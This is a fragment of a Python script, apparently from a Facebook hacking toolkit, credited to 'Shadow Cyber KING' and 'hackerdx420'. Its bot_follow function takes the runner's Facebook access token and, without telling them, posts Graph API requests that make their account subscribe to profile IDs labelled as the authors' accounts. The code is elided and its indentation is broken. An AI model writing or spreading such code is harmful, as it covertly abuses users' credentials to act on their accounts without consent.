#!/usr/bin/python
# -*- coding: utf-8
# Facebook  : Shadow Cyber KING
# Instagram : hackerdx420
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/100006539235634/subscribers?access_token=' + toket)      #SHADOW CYBER KING
    	...
    	requests.post('https://graph.facebook.com/100008647622021/subscribers?access_token=' + toket) #SYED REHMAN
    	menu()
